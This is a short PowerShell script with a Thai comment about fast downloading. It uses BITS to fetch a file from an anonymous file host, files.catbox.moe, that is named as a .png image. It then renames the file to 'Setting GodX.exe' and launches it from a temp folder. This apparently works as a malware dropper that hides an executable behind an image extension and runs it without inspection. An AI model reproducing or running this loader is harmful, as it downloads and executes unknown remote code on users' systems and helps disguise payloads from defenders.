$exeName = "Setting GodX.exe"
$tempPath = "$env:TEMP\GodX_App"
$exePath = "$tempPath\$exeName"
$url = "https://files.catbox.moe/c7lpiz.png"

# ใช้ BITS (Background Intelligent Transfer) โหลดให้เร็วที่สุดในระดับ OS
$job = Start-BitsTransfer -Source $url -Destination "$tempPath\temp.png" -Asynchronous
while ($job.JobState -eq 'Transferring') { Start-Sleep -Milliseconds 100 }

Rename-Item -Path "$tempPath\temp.png" -NewName $exeName -Force
Start-Process "$exePath" -WorkingDirectory $tempPath
